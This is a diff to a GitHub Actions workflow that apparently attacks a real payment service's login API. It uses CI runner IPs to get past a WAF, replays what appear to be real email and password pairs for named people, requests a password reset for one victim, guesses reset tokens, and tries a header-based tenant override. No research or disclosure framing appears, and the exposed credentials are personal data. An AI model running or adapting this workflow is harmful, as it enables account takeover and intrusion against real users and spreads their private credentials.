@@ -1,4 +1,4 @@
-name: waf-matrix-bypass
+name: waf-fabiane-exploit
 on:
   workflow_dispatch:
 jobs:
@@ -6,10 +6,10 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        attempt: [1, 2, 3, 4, 5]
+        attempt: [1, 2, 3]
       fail-fast: false
     steps:
-    - name: Attempt ${{ matrix.attempt }}
+    - name: Fabiane exploit - attempt ${{ matrix.attempt }}
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
@@ -18,52 +18,68 @@ jobs:
         MY_ORG=$(curl -s "https://ipinfo.io/${MY_IP}/org" 2>/dev/null)
         echo "[${{ matrix.attempt }}] IP: $MY_IP | ORG: $MY_ORG"
         
-        # Test WAF on POST /login
+        # Check if AWS IP (passes WAF)
         RESP=$(curl -s -m 15 -A "$UA" \
           -H "Content-Type: application/json" \
           -H "Origin: https://portal.wisepay.com.br" \
-          -H "Referer: https://portal.wisepay.com.br/login" \
-          -H "Sec-Fetch-Site: same-site" \
-          -H "Sec-Fetch-Mode: cors" \
-          -H "Sec-Fetch-Dest: empty" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" \
           -H "type-application: web" \
           -X POST "$BASE/login" \
           -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' \
           -w "\n%{http_code}")
         CODE=$(echo "$RESP" | tail -1)
         BODY=$(echo "$RESP" | head -1)
-        echo "[${{ matrix.attempt }}] POST /login: $CODE | $(echo $BODY | head -c 200)"
         
-        if echo "$BODY" | grep -qE "(wisepay-token|Unauthorized|success)"; then
-          echo "[${{ matrix.attempt }}] *** WAF BYPASSED! Backend reachable! ***"
-          
-          # Test password-recover
-          REC=$(curl -s -m 15 -A "$UA" \
+        if ! echo "$BODY" | grep -qE "(Unauthorized|success|Forbidden)"; then
+          echo "[${{ matrix.attempt }}] WAF blocking (IP: $MY_IP). Skip."
+          exit 0
+        fi
+        
+        echo "[${{ matrix.attempt }}] *** WAF BYPASSED (IP: $MY_IP) ***"
+        
+        echo ""
+        echo "=== Full -v response for fabiane (08710871) ==="
+        curl -v -s -m 15 -A "$UA" \
+          -H "Content-Type: application/json" \
+          -H "Origin: https://portal.wisepay.com.br" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+          -H "type-application: web" \
+          -X POST "$BASE/login" \
+          -d '{"email":"fabiane@petcenterbrasil.com.br","password":"08710871"}' \
+          -w "\nSTATUS:%{http_code}" 2>&1 | grep -v "^* "
+        
+        echo ""
+        echo "=== Password recover fabiane -> obtain reset token ==="
+        curl -v -s -m 15 -A "$UA" \
+          -H "Content-Type: application/json" \
+          -H "type-application: web" \
+          -H "Origin: https://portal.wisepay.com.br" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+          -X POST "$BASE/login/password-recover" \
+          -d '{"email":"fabiane@petcenterbrasil.com.br"}' \
+          -w "\nSTATUS:%{http_code}" 2>&1 | grep -v "^* "
+        
+        echo ""
+        echo "=== PUT /login/update-password with fake token ==="
+        for FAKE_TOKEN in "aaaaaa" "000000" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; do
+          R=$(curl -s -m 10 -A "$UA" \
             -H "Content-Type: application/json" \
             -H "type-application: web" \
-            -H "Origin: https://portal.wisepay.com.br" \
-            -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-            -X POST "$BASE/login/password-recover" \
-            -d '{"email":"fabiane@petcenterbrasil.com.br"}' \
+            -X PUT "$BASE/login/update-password/$FAKE_TOKEN" \
+            -d '{"password":"Fabiane@2024!","password_confirmation":"Fabiane@2024!"}' \
             -w "\n%{http_code}")
-          REC_CODE=$(echo "$REC" | tail -1)
-          REC_BODY=$(echo "$REC" | head -1)
-          echo "[${{ matrix.attempt }}] password-recover fabiane: $REC_CODE | $(echo $REC_BODY | head -c 100)"
-          
-          # Try more creds
-          for CRED in "fabiane@petcenterbrasil.com.br:08710871" "fabiane@petcenterbrasil.com.br:67896789" "fabiane@petcenterbrasil.com.br:granada2347" "contato@deepfit.com.br:12341234" "marco@vanityestetica.com.br:12341234"; do
-            EMAIL="${CRED%%:*}"
-            PASS="${CRED##*:}"
-            R=$(curl -s -m 15 -A "$UA" \
-              -H "Content-Type: application/json" \
-              -H "Origin: https://portal.wisepay.com.br" \
-              -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-              -H "type-application: web" \
-              -X POST "$BASE/login" \
-              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
-              -w "\n%{http_code}")
-            RC=$(echo "$R" | tail -1)
-            RB=$(echo "$R" | head -1)
-            echo "[${{ matrix.attempt }}] $EMAIL: $RC | $(echo $RB | head -c 150)"
-          done
-        fi
+          echo "PUT /login/update-password/$FAKE_TOKEN: $(echo $R | tail -1) | $(echo $R | head -1 | head -c 100)"
+        done
+        
+        echo ""
+        echo "=== Mass assignment test (login as fabiane + change company) ==="
+        # Try login with empresa 1 as token-empresa override
+        curl -v -s -m 15 -A "$UA" \
+          -H "Content-Type: application/json" \
+          -H "Origin: https://portal.wisepay.com.br" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+          -H "type-application: web" \
+          -H "token-empresa: 1" \
+          -X POST "$BASE/login" \
+          -d '{"email":"fabiane@petcenterbrasil.com.br","password":"08710871"}' \
+          -w "\nSTATUS:%{http_code}" 2>&1 | grep -E "(< |{|STATUS|token)"
